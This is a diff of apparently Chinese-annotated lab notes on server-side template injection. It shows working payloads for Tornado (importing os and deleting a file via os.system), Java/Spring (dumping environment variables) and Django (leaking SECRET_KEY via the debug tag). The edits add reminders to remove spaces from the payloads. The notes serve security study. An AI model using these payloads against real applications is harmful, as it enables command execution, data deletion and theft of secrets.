@@ -182,7 +182,7 @@ RUBY ERB template
 
 lab2：
 PYTHON Tornado template
-blog-post-author-display=user.name } } { % 25+import+os+%25 } { { os.system('rm%20/home/carlos/morale.txt')
+blog-post-author-display=user.name } } { % 25+import+os+%25 } { { os.system('rm%20/home/carlos/morale.txt')   （去掉空格）
 ```
 
 #### Read about the security implications
@@ -281,7 +281,7 @@ ${T(java.lang.System).getenv()}
 
 	lab：
 	Python Django framework
-	1. {% debug %}
+	1. { % debug % }     （去掉空格）
 	2. find settings 
 	3.{{settings.SECRET_KEY}}
 ## Create a custom attack
